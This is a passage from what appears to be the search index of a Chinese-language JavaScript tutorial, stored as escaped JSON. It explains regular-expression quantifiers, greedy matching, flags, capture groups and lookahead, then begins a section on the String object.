\u95ee\u53f7\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u62161\u6b21\uff0c\u7b49\u540c\u4e8e {0, 1} \u3002 * \u661f\u53f7\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u6216\u591a\u6b21\uff0c\u7b49\u540c\u4e8e {0,} \u3002 + \u52a0\u53f7\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b01\u6b21\u6216\u591a\u6b21\uff0c\u7b49\u540c\u4e8e {1,} \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // t \u51fa\u73b00\u6b21\u62161\u6b21 /t?est/ . test ( 'test' ) // true /t?est/ . test ( 'est' ) // true // t \u51fa\u73b01\u6b21\u6216\u591a\u6b21 /t+est/ . test ( 'test' ) // true /t+est/ . test ( 'ttest' ) // true /t+est/ . test ( 'est' ) // false // t \u51fa\u73b00\u6b21\u6216\u591a\u6b21 /t*est/ . test ( 'test' ) // true /t*est/ . test ( 'ttest' ) // true /t*est/ . test ( 'tttest' ) // true /t*est/ . test ( 'est' ) // true","title":"\u91cf\u8bcd\u7b26"},{"location":"stdlib/regexp/#_13","text":"\u4e0a\u4e00\u5c0f\u8282\u7684\u4e09\u4e2a\u91cf\u8bcd\u7b26\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u6700\u5927\u53ef\u80fd\u5339\u914d\uff0c\u5373\u5339\u914d\u5230\u4e0b\u4e00\u4e2a\u5b57\u7b26\u4e0d\u6ee1\u8db3\u5339\u914d\u89c4\u5219\u4e3a\u6b62\u3002\u8fd9\u88ab\u79f0\u4e3a\u8d2a\u5a6a\u6a21\u5f0f\u3002 1 2 var s = 'aaa' ; s . match ( /a+/ ) // [\"aaa\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6a21\u5f0f\u662f /a+/ \uff0c\u8868\u793a\u5339\u914d1\u4e2a a \u6216\u591a\u4e2a a \uff0c\u90a3\u4e48\u5230\u5e95\u4f1a\u5339\u914d\u51e0\u4e2a a \u5462\uff1f\u56e0\u4e3a\u9ed8\u8ba4\u662f\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u4f1a\u4e00\u76f4\u5339\u914d\u5230\u5b57\u7b26 a \u4e0d\u51fa\u73b0\u4e3a\u6b62\uff0c\u6240\u4ee5\u5339\u914d\u7ed3\u679c\u662f3\u4e2a a \u3002 \u9664\u4e86\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u8fd8\u6709\u975e\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u5373\u6700\u5c0f\u53ef\u80fd\u5339\u914d\u3002\u53ea\u8981\u4e00\u53d1\u73b0\u5339\u914d\uff0c\u5c31\u8fd4\u56de\u7ed3\u679c\uff0c\u4e0d\u8981\u5f80\u4e0b\u68c0\u67e5\u3002\u5982\u679c\u60f3\u5c06\u8d2a\u5a6a\u6a21\u5f0f\u6539\u4e3a\u975e\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u53ef\u4ee5\u5728\u91cf\u8bcd\u7b26\u540e\u9762\u52a0\u4e00\u4e2a\u95ee\u53f7\u3002 1 2 var s = 'aaa' ; s . match ( /a+?/ ) // [\"a\"] \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c\u6a21\u5f0f\u7ed3\u5c3e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u95ee\u53f7 /a+?/ \uff0c\u8fd9\u65f6\u5c31\u6539\u4e3a\u975e\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u4e00\u65e6\u6761\u4ef6\u6ee1\u8db3\uff0c\u5c31\u4e0d\u518d\u5f80\u4e0b\u5339\u914d\uff0c +? \u8868\u793a\u53ea\u8981\u53d1\u73b0\u4e00\u4e2a a \uff0c\u5c31\u4e0d\u518d\u5f80\u4e0b\u5339\u914d\u4e86\u3002 \u9664\u4e86\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u52a0\u53f7\uff08 +? \uff09\uff0c\u8fd8\u6709\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u661f\u53f7\uff08 *? \uff09\u548c\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u95ee\u53f7\uff08 ?? \uff09\u3002 +? \uff1a\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b01\u6b21\u6216\u591a\u6b21\uff0c\u5339\u914d\u65f6\u91c7\u7528\u975e\u8d2a\u5a6a\u6a21\u5f0f\u3002 *? \uff1a\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u6216\u591a\u6b21\uff0c\u5339\u914d\u65f6\u91c7\u7528\u975e\u8d2a\u5a6a\u6a21\u5f0f\u3002 ?? \uff1a\u8868\u683c\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u62161\u6b21\uff0c\u5339\u914d\u65f6\u91c7\u7528\u975e\u8d2a\u5a6a\u6a21\u5f0f\u3002 1 2 3 4 5 'abb' . match ( /ab*/ ) // [\"abb\"] 'abb' . match ( /ab*?/ ) // [\"a\"] 'abb' . match ( /ab?/ ) // [\"ab\"] 'abb' . match ( /ab??/ ) // [\"a\"] \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c /ab*/ \u8868\u793a\u5982\u679c a \u540e\u9762\u6709\u591a\u4e2a b \uff0c\u90a3\u4e48\u5339\u914d\u5c3d\u53ef\u80fd\u591a\u7684 b \uff1b /ab*?/ \u8868\u793a\u5339\u914d\u5c3d\u53ef\u80fd\u5c11\u7684 b \uff0c\u4e5f\u5c31\u662f0\u4e2a b \u3002","title":"\u8d2a\u5a6a\u6a21\u5f0f"},{"location":"stdlib/regexp/#_14","text":"\u4fee\u9970\u7b26\uff08modifier\uff09\u8868\u793a\u6a21\u5f0f\u7684\u9644\u52a0\u89c4\u5219\uff0c\u653e\u5728\u6b63\u5219\u6a21\u5f0f\u7684\u6700\u5c3e\u90e8\u3002 \u4fee\u9970\u7b26\u53ef\u4ee5\u5355\u4e2a\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u591a\u4e2a\u4e00\u8d77\u4f7f\u7528\u3002 1 2 3 4 5 // \u5355\u4e2a\u4fee\u9970\u7b26 var regex = /test/i ; // \u591a\u4e2a\u4fee\u9970\u7b26 var regex = /test/ig ; \uff081\uff09g \u4fee\u9970\u7b26 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7b2c\u4e00\u6b21\u5339\u914d\u6210\u529f\u540e\uff0c\u6b63\u5219\u5bf9\u8c61\u5c31\u505c\u6b62\u5411\u4e0b\u5339\u914d\u4e86\u3002 g \u4fee\u9970\u7b26\u8868\u793a\u5168\u5c40\u5339\u914d\uff08global\uff09\uff0c\u52a0\u4e0a\u5b83\u4ee5\u540e\uff0c\u6b63\u5219\u5bf9\u8c61\u5c06\u5339\u914d\u5168\u90e8\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c\uff0c\u4e3b\u8981\u7528\u4e8e\u641c\u7d22\u548c\u66ff\u6362\u3002 1 2 3 4 5 6 var regex = /b/ ; var str = 'abba' ; regex . test ( str ); // true regex . test ( str ); // true regex . test ( str ); // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u6a21\u5f0f\u4e0d\u542b g \u4fee\u9970\u7b26\uff0c\u6bcf\u6b21\u90fd\u662f\u4ece\u5b57\u7b26\u4e32\u5934\u90e8\u5f00\u59cb\u5339\u914d\u3002\u6240\u4ee5\uff0c\u8fde\u7eed\u505a\u4e86\u4e09\u6b21\u5339\u914d\uff0c\u90fd\u8fd4\u56de true \u3002 1 2 3 4 5 6 var regex = /b/g ; var str = 'abba' ; regex . test ( str ); // true regex . test ( str ); // true regex . test ( str ); // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u6a21\u5f0f\u542b\u6709 g \u4fee\u9970\u7b26\uff0c\u6bcf\u6b21\u90fd\u662f\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u6210\u529f\u5904\uff0c\u5f00\u59cb\u5411\u540e\u5339\u914d\u3002\u56e0\u4e3a\u5b57\u7b26\u4e32 abba \u53ea\u6709\u4e24\u4e2a b \uff0c\u6240\u4ee5\u524d\u4e24\u6b21\u5339\u914d\u7ed3\u679c\u4e3a true \uff0c\u7b2c\u4e09\u6b21\u5339\u914d\u7ed3\u679c\u4e3a false \u3002 \uff082\uff09i \u4fee\u9970\u7b26 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6b63\u5219\u5bf9\u8c61\u533a\u5206\u5b57\u6bcd\u7684\u5927\u5c0f\u5199\uff0c\u52a0\u4e0a i \u4fee\u9970\u7b26\u4ee5\u540e\u8868\u793a\u5ffd\u7565\u5927\u5c0f\u5199\uff08ignoreCase\uff09\u3002 1 2 /abc/ . test ( 'ABC' ) // false /abc/i . test ( 'ABC' ) // true \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u52a0\u4e86 i \u4fee\u9970\u7b26\u4ee5\u540e\uff0c\u4e0d\u8003\u8651\u5927\u5c0f\u5199\uff0c\u6240\u4ee5\u6a21\u5f0f abc \u5339\u914d\u5b57\u7b26\u4e32 ABC \u3002 \uff083\uff09m \u4fee\u9970\u7b26 m \u4fee\u9970\u7b26\u8868\u793a\u591a\u884c\u6a21\u5f0f\uff08multiline\uff09\uff0c\u4f1a\u4fee\u6539 ^ \u548c $ \u7684\u884c\u4e3a\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08\u5373\u4e0d\u52a0 m \u4fee\u9970\u7b26\u65f6\uff09\uff0c ^ \u548c $ \u5339\u914d\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u5904\u548c\u7ed3\u5c3e\u5904\uff0c\u52a0\u4e0a m \u4fee\u9970\u7b26\u4ee5\u540e\uff0c ^ \u548c $ \u8fd8\u4f1a\u5339\u914d\u884c\u9996\u548c\u884c\u5c3e\uff0c\u5373 ^ \u548c $ \u4f1a\u8bc6\u522b\u6362\u884c\u7b26\uff08 \\n \uff09\u3002 1 2 /world$/ . test ( 'hello world\\n' ) // false /world$/m . test ( 'hello world\\n' ) // true \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u7ed3\u5c3e\u5904\u6709\u4e00\u4e2a\u6362\u884c\u7b26\u3002\u5982\u679c\u4e0d\u52a0 m \u4fee\u9970\u7b26\uff0c\u5339\u914d\u4e0d\u6210\u529f\uff0c\u56e0\u4e3a\u5b57\u7b26\u4e32\u7684\u7ed3\u5c3e\u4e0d\u662f world \uff1b\u52a0\u4e0a\u4ee5\u540e\uff0c $ \u53ef\u4ee5\u5339\u914d\u884c\u5c3e\u3002 1 /^b/m . test ( 'a\\nb' ) // true \u4e0a\u9762\u4ee3\u7801\u8981\u6c42\u5339\u914d\u884c\u9996\u7684 b \uff0c\u5982\u679c\u4e0d\u52a0 m \u4fee\u9970\u7b26\uff0c\u5c31\u76f8\u5f53\u4e8e b \u53ea\u80fd\u5904\u5728\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u5904\u3002\u52a0\u4e0a m \u4fee\u9970\u7b26\u4ee5\u540e\uff0c\u6362\u884c\u7b26 \\n \u4e5f\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e00\u884c\u7684\u5f00\u59cb\u3002","title":"\u4fee\u9970\u7b26"},{"location":"stdlib/regexp/#_15","text":"\uff081\uff09\u6982\u8ff0 \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u62ec\u53f7\u8868\u793a\u5206\u7ec4\u5339\u914d\uff0c\u62ec\u53f7\u4e2d\u7684\u6a21\u5f0f\u53ef\u4ee5\u7528\u6765\u5339\u914d\u5206\u7ec4\u7684\u5185\u5bb9\u3002 1 2 /fred+/ . test ( 'fredd' ) // true /(fred)+/ . test ( 'fredfred' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u6a21\u5f0f\u6ca1\u6709\u62ec\u53f7\uff0c\u7ed3\u679c + \u53ea\u8868\u793a\u91cd\u590d\u5b57\u6bcd d \uff0c\u7b2c\u4e8c\u4e2a\u6a21\u5f0f\u6709\u62ec\u53f7\uff0c\u7ed3\u679c + \u5c31\u8868\u793a\u5339\u914d fred \u8fd9\u4e2a\u8bcd\u3002 \u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u5206\u7ec4\u6355\u83b7\u7684\u4f8b\u5b50\u3002 1 2 3 var m = 'abcabc' . match ( /(.)b(.)/ ); m // ['abc', 'a', 'c'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f /(.)b(.)/ \u4e00\u5171\u4f7f\u7528\u4e24\u4e2a\u62ec\u53f7\uff0c\u7b2c\u4e00\u4e2a\u62ec\u53f7\u6355\u83b7 a \uff0c\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u6355\u83b7 c \u3002 \u6ce8\u610f\uff0c\u4f7f\u7528\u7ec4\u5339\u914d\u65f6\uff0c\u4e0d\u5b9c\u540c\u65f6\u4f7f\u7528 g \u4fee\u9970\u7b26\uff0c\u5426\u5219 match \u65b9\u6cd5\u4e0d\u4f1a\u6355\u83b7\u5206\u7ec4\u7684\u5185\u5bb9\u3002 1 2 var m = 'abcabc' . match ( /(.)b(.)/g ); m // ['abc', 'abc'] \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u5e26 g \u4fee\u9970\u7b26\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7ed3\u679c match \u65b9\u6cd5\u53ea\u6355\u83b7\u4e86\u5339\u914d\u6574\u4e2a\u8868\u8fbe\u5f0f\u7684\u90e8\u5206\u3002\u8fd9\u65f6\u5fc5\u987b\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684 exec \u65b9\u6cd5\uff0c\u914d\u5408\u5faa\u73af\uff0c\u624d\u80fd\u8bfb\u5230\u6bcf\u4e00\u8f6e\u5339\u914d\u7684\u7ec4\u6355\u83b7\u3002 1 2 3 4 5 6 7 8 9 var str = 'abcabc' ; var reg = /(.)b(.)/g ; while ( true ) { var result = reg . exec ( str ); if ( ! result ) break ; console . log ( result ); } // [\"abc\", \"a\", \"c\"] // [\"abc\", \"a\", \"c\"] \u6b63\u5219\u8868\u8fbe\u5f0f\u5185\u90e8\uff0c\u8fd8\u53ef\u4ee5\u7528 \\n \u5f15\u7528\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\uff0c n \u662f\u4ece1\u5f00\u59cb\u7684\u81ea\u7136\u6570\uff0c\u8868\u793a\u5bf9\u5e94\u987a\u5e8f\u7684\u62ec\u53f7\u3002 1 2 /(.)b(.)\\1b\\2/ . test ( \"abcabc\" ) // true \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c \\1 \u8868\u793a\u7b2c\u4e00\u4e2a\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\uff08\u5373 a \uff09\uff0c \\2 \u8868\u793a\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\uff08\u5373 c \uff09\u3002 \u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\u3002 1 /y(..)(.)\\2\\1/ . test ( 'yabccab' ) // true \u62ec\u53f7\u8fd8\u53ef\u4ee5\u5d4c\u5957\u3002 1 /y((..)\\2)\\1/ . test ( 'yabababab' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\1 \u6307\u5411\u5916\u5c42\u62ec\u53f7\uff0c \\2 \u6307\u5411\u5185\u5c42\u62ec\u53f7\u3002 \u7ec4\u5339\u914d\u975e\u5e38\u6709\u7528\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u5339\u914d\u7f51\u9875\u6807\u7b7e\u7684\u4f8b\u5b50\u3002 1 2 3 4 var tagName = /<([^>]+)>[^<]*<\\/\\1>/ ; tagName . exec ( \"<b>bold</b>\" )[ 1 ] // 'b' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5706\u62ec\u53f7\u5339\u914d\u5c16\u62ec\u53f7\u4e4b\u4e2d\u7684\u6807\u7b7e\uff0c\u800c \\1 \u5c31\u8868\u793a\u5bf9\u5e94\u7684\u95ed\u5408\u6807\u7b7e\u3002 \u4e0a\u9762\u4ee3\u7801\u7565\u52a0\u4fee\u6539\uff0c\u5c31\u80fd\u6355\u83b7\u5e26\u6709\u5c5e\u6027\u7684\u6807\u7b7e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var html = '<b class=\"hello\">Hello</b><i>world</i>' ; var tag = /<(\\w+)([^>]*)>(.*?)<\\/\\1>/g ; var match = tag . exec ( html ); match [ 1 ] // \"b\" match [ 2 ] // \" class=\"hello\"\" match [ 3 ] // \"Hello\" match = tag . exec ( html ); match [ 1 ] // \"i\" match [ 2 ] // \"\" match [ 3 ] // \"world\" \uff082\uff09\u975e\u6355\u83b7\u7ec4 (?:x) \u79f0\u4e3a\u975e\u6355\u83b7\u7ec4\uff08Non-capturing group\uff09\uff0c\u8868\u793a\u4e0d\u8fd4\u56de\u8be5\u7ec4\u5339\u914d\u7684\u5185\u5bb9\uff0c\u5373\u5339\u914d\u7684\u7ed3\u679c\u4e2d\u4e0d\u8ba1\u5165\u8fd9\u4e2a\u62ec\u53f7\u3002 \u975e\u6355\u83b7\u7ec4\u7684\u4f5c\u7528\u8bf7\u8003\u8651\u8fd9\u6837\u4e00\u4e2a\u573a\u666f\uff0c\u5047\u5b9a\u9700\u8981\u5339\u914d foo \u6216\u8005 foofoo \uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u5c31\u5e94\u8be5\u5199\u6210 /(foo){1, 2}/ \uff0c\u4f46\u662f\u8fd9\u6837\u4f1a\u5360\u7528\u4e00\u4e2a\u7ec4\u5339\u914d\u3002\u8fd9\u65f6\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u975e\u6355\u83b7\u7ec4\uff0c\u5c06\u6b63\u5219\u8868\u8fbe\u5f0f\u6539\u4e3a /(?:foo){1, 2}/ \uff0c\u5b83\u7684\u4f5c\u7528\u4e0e\u524d\u4e00\u4e2a\u6b63\u5219\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u5355\u72ec\u8f93\u51fa\u62ec\u53f7\u5185\u90e8\u7684\u5185\u5bb9\u3002 \u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 1 2 var m = 'abc' . match ( /(?:.)b(.)/ ); m // [\"abc\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u6a21\u5f0f\uff0c\u4e00\u5171\u4f7f\u7528\u4e86\u4e24\u4e2a\u62ec\u53f7\u3002\u5176\u4e2d\u7b2c\u4e00\u4e2a\u62ec\u53f7\u662f\u975e\u6355\u83b7\u7ec4\uff0c\u6240\u4ee5\u6700\u540e\u8fd4\u56de\u7684\u7ed3\u679c\u4e2d\u6ca1\u6709\u7b2c\u4e00\u4e2a\u62ec\u53f7\uff0c\u53ea\u6709\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u662f\u7528\u6765\u5206\u89e3\u7f51\u5740\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u6b63\u5e38\u5339\u914d var url = /(http|ftp):\\/\\/([^/\\r\\n]+)(\\/[^\\r\\n]*)?/ ; url . exec ( 'http://google.com/' ); // [\"http://google.com/\", \"http\", \"google.com\", \"/\"] // \u975e\u6355\u83b7\u7ec4\u5339\u914d var url = /(?:http|ftp):\\/\\/([^/\\r\\n]+)(\\/[^\\r\\n]*)?/ ; url . exec ( 'http://google.com/' ); // [\"http://google.com/\", \"google.com\", \"/\"] \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u524d\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u6b63\u5e38\u5339\u914d\uff0c\u7b2c\u4e00\u4e2a\u62ec\u53f7\u8fd4\u56de\u7f51\u7edc\u534f\u8bae\uff1b\u540e\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u975e\u6355\u83b7\u5339\u914d\uff0c\u8fd4\u56de\u7ed3\u679c\u4e2d\u4e0d\u5305\u62ec\u7f51\u7edc\u534f\u8bae\u3002 \uff083\uff09\u5148\u884c\u65ad\u8a00 x(?=y) \u79f0\u4e3a\u5148\u884c\u65ad\u8a00\uff08Positive look-ahead\uff09\uff0c x \u53ea\u6709\u5728 y \u524d\u9762\u624d\u5339\u914d\uff0c y \u4e0d\u4f1a\u88ab\u8ba1\u5165\u8fd4\u56de\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u8981\u5339\u914d\u540e\u9762\u8ddf\u7740\u767e\u5206\u53f7\u7684\u6570\u5b57\uff0c\u53ef\u4ee5\u5199\u6210 /\\d+(?=%)/ \u3002 \u201c\u5148\u884c\u65ad\u8a00\u201d\u4e2d\uff0c\u62ec\u53f7\u91cc\u7684\u90e8\u5206\u662f\u4e0d\u4f1a\u8fd4\u56de\u7684\u3002 1 2 var m = 'abc' . match ( /b(?=c)/ ); m // [\"b\"] \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u7528\u4e86\u5148\u884c\u65ad\u8a00\uff0c b \u5728 c \u524d\u9762\u6240\u4ee5\u88ab\u5339\u914d\uff0c\u4f46\u662f\u62ec\u53f7\u5bf9\u5e94\u7684 c \u4e0d\u4f1a\u88ab\u8fd4\u56de\u3002 \uff084\uff09\u5148\u884c\u5426\u5b9a\u65ad\u8a00 x(?!y) \u79f0\u4e3a\u5148\u884c\u5426\u5b9a\u65ad\u8a00\uff08Negative look-ahead\uff09\uff0c x \u53ea\u6709\u4e0d\u5728 y \u524d\u9762\u624d\u5339\u914d\uff0c y \u4e0d\u4f1a\u88ab\u8ba1\u5165\u8fd4\u56de\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u8981\u5339\u914d\u540e\u9762\u8ddf\u7684\u4e0d\u662f\u767e\u5206\u53f7\u7684\u6570\u5b57\uff0c\u5c31\u8981\u5199\u6210 /\\d+(?!%)/ \u3002 1 2 /\\d+(?!\\.)/ . exec ( '3.14' ) // [\"14\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u6307\u5b9a\uff0c\u53ea\u6709\u4e0d\u5728\u5c0f\u6570\u70b9\u524d\u9762\u7684\u6570\u5b57\u624d\u4f1a\u88ab\u5339\u914d\uff0c\u56e0\u6b64\u8fd4\u56de\u7684\u7ed3\u679c\u5c31\u662f 14 \u3002 \u201c\u5148\u884c\u5426\u5b9a\u65ad\u8a00\u201d\u4e2d\uff0c\u62ec\u53f7\u91cc\u7684\u90e8\u5206\u662f\u4e0d\u4f1a\u8fd4\u56de\u7684\u3002 1 2 var m = 'abd' . match ( /b(?!c)/ ); m // ['b'] \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u7528\u4e86\u5148\u884c\u5426\u5b9a\u65ad\u8a00\uff0c b \u4e0d\u5728 c \u524d\u9762\u6240\u4ee5\u88ab\u5339\u914d\uff0c\u800c\u4e14\u62ec\u53f7\u5bf9\u5e94\u7684 d \u4e0d\u4f1a\u88ab\u8fd4\u56de\u3002","title":"\u7ec4\u5339\u914d"},{"location":"stdlib/regexp/#_16","text":"Axel Rauschmayer, JavaScript: an overview of the regular expression API Mozilla Developer Network, Regular Expressions Axel Rauschmayer, The flag /g of JavaScript\u2019s regular expressions Sam Hughes, Learn regular expressions in about 55 minutes","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"stdlib/string/","text":"String \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 String \u5bf9\u8c61\u662f JavaScript \u539f\u751f\u63d0\u4f9b\u7684\u4e09\u4e2a\u5305\u88c5\u5bf9\u8c61\u4e4b\u4e00\uff0c\u7528\u6765\u751f\u6210\u5b57\u7b26\u4e32\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 var s1 = 'abc' ; var s2 = new String ( 'abc' ); typeof s1 // \"string\" typeof s2 // \"object\" s2 . valueOf () // \"abc\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf s1 \u662f\u5b57\u7b26\u4e32\uff0c s2 \u662f\u5bf9\u8c61\u3002\u7531\u4e8e s2 \u662f\u5b57\u7b26\u4e32\u5bf9\u8c61\uff0c s2.valueOf \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u5b83\u6240\u5bf9\u5e94\u7684\u539f\u59cb\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u5bf9\u8c61\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08\u5f88\u50cf\u6570\u7ec4\uff0c\u4f46\u4e0d\u662f\u6570\u7ec4\uff09\u3002 1 2 3 4 new String ( 'abc' ) // String {0: \"a\", 1: \"b\", 2: \"c\", length: 3} ( new String ( 'abc' ))[ 1 ] // \"b\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 abc \u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5bf9\u8c61\uff0c\u6709\u6570\u503c\u952e\uff08 0 \u3001 1 \u3001 2 \uff09\u548c length \u5c5e\u6027\uff0c\u6240\u4ee5\u53ef\u4ee5\u50cf\u6570\u7ec4\u90a3\u6837\u53d6\u503c\u3002 \u9664\u4e86\u7528\u4f5c\u6784\u9020\u51fd\u6570\uff0c String \u5bf9\u8c61\u8fd8\u53ef\u4ee5\u5f53\u4f5c\u5de5\u5177\u65b9\u6cd5\u4f7f\u7528\uff0c\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 String ( true ) // \"true\" String ( 5 ) // \"5\" \u4e0a\u9762\u4ee3\u7801\u5c06\u5e03\u5c14\u503c true \u548c\u6570\u503c 5 \uff0c\u5206\u522b\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u3002 \u9759\u6001\u65b9\u6cd5 \u00b6 String.fromCharCode() \u00b6 String \u5bf9\u8c61\u63d0\u4f9b\u7684\u9759\u6001\u65b9\u6cd5\uff08\u5373\u5b9a\u4e49\u5728\u5bf9\u8c61\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u5728\u5bf9\u8c61\u5b9e\u4f8b\u7684\u65b9\u6cd5\uff09\uff0c\u4e3b\u8981\u662f String.fromCharCode() \u3002\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u6216\u591a\u4e2a\u6570\u503c\uff0c\u4ee3\u8868 Unicode \u7801\u70b9\uff0c\u8fd4\u56de\u503c\u662f\u8fd9\u4e9b\u7801\u70b9\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 String . fromCharCode () // \"\" String . fromCharCode ( 97 ) // \"a\" String . fromCharCode ( 104 , 101 , 108 , 108 , 111 ) // \"hello\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c String.fromCharCode \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u7a7a\uff0c\u5c31\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\uff1b\u5426\u5219\uff0c\u8fd4\u56de\u53c2\u6570\u5bf9\u5e94\u7684 Unicode \u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u652f\u6301 Unicode \u7801\u70b9\u5927\u4e8e 0xFFFF \u7684\u5b57\u7b26\uff0c\u5373\u4f20\u5165\u7684\u53c2\u6570\u4e0d\u80fd\u5927\u4e8e 0xFFFF \uff08\u5373\u5341\u8fdb\u5236\u7684 65535\uff09\u3002 1 2 3 4 String . fromCharCode ( 0x20BB7 ) // \"\u0bb7\" String . fromCharCode ( 0x20BB7 ) === String . fromCharCode ( 0x0BB7 ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c String.fromCharCode \u53c2\u6570 0x20BB7 \u5927\u4e8e 0xFFFF \uff0c\u5bfc\u81f4\u8fd4\u56de\u7ed3\u679c\u51fa\u9519\u3002 0x20BB7 \u5bf9\u5e94\u7684\u5b57\u7b26\u662f\u6c49\u5b57 \ud842\udfb7 \uff0c\u4f46\u662f\u8fd4\u56de\u7ed3\u679c\u5374\u662f\u53e6\u4e00\u4e2a\u5b57\u7b26\uff08\u7801\u70b9 0x0BB7 \uff09\u3002\u8fd9\u662f\u56e0\u4e3a String.fromCharCode \u53d1\u73b0\u53c2\u6570\u503c\u5927\u4e8e 0xFFFF \uff0c\u5c31\u4f1a\u5ffd\u7565\u591a\u51fa\u7684\u4f4d\uff08\u5373\u5ffd\u7565 0x20BB7 \u91cc\u9762\u7684 2 \uff09\u3002 \u8fd9\u79cd\u73b0\u8c61\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\uff0c\u7801\u70b9\u5927\u4e8e 0xFFFF \u7684\u5b57\u7b26\u5360\u7528\u56db\u4e2a\u5b57\u8282\uff0c\u800c JavaScript \u9ed8\u8ba4\u652f\u6301\u4e24\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5fc5\u987b\u628a 0x20BB7 